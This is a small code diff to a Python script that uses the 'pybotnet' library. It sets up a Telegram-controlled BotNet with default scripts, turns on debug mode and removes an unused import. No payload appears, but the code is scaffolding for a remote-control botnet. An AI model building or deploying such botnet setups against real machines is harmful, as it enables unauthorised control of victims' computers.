@@ -1,4 +1,4 @@
-from os import listdir, getcwd
+from os import listdir
 import logging
 
 from pybotnet import BotNet, Request, UserException, TelegramEngine
@@ -14,7 +14,7 @@ telegram_engine = TelegramEngine(
 )
 
 
-botnet = BotNet(telegram_engine, debug=False, use_default_scripts=True)
+botnet = BotNet(telegram_engine, debug=True, use_default_scripts=True)
 
 # create new script
 @botnet.add_script(script_version="0.1.0")
